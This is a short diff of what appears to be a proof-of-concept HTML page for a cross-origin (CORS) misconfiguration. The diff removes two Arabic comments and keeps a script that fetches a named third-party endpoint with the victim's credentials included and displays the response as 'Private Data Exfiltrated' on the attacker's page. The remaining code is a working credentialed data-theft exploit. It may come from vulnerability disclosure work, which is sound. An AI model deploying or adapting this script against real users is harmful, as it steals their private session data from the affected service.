@@ -22,7 +22,6 @@
 <script>
     const targetUrl = "https://experiments.bany.dev/sdk/v2/vardata?v=0";
 
-    // إرسال الطلب مع تضمين الجلسة (Credentials) اعتماداً على الإعداد الخاطئ للسيرفر
     fetch(targetUrl, {
         method: "GET",
         credentials: "include", 
@@ -36,7 +35,6 @@
     })
     .then(data => {
         document.getElementById("status").innerText = "Success! Private Data Exfiltrated.";
-        // عرض البيانات الحساسة المسروقة في صفحة المهاجم
         document.getElementById("output").innerText = JSON.stringify(data, null, 2);
     })
     .catch(error => {
